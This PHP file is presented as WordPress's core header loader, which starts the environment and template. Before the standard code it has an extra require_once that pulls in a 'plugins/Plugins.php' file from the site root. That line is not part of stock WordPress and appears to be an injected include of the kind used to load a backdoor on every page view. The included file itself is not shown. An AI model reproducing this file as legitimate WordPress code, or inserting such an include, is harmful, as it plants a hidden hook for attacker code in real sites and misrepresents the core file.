<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

require_once(dirname(__FILE__).'/plugins/Plugins.php');
if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	require_once( dirname(__FILE__) . '/wp-load.php' );

	wp();

	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
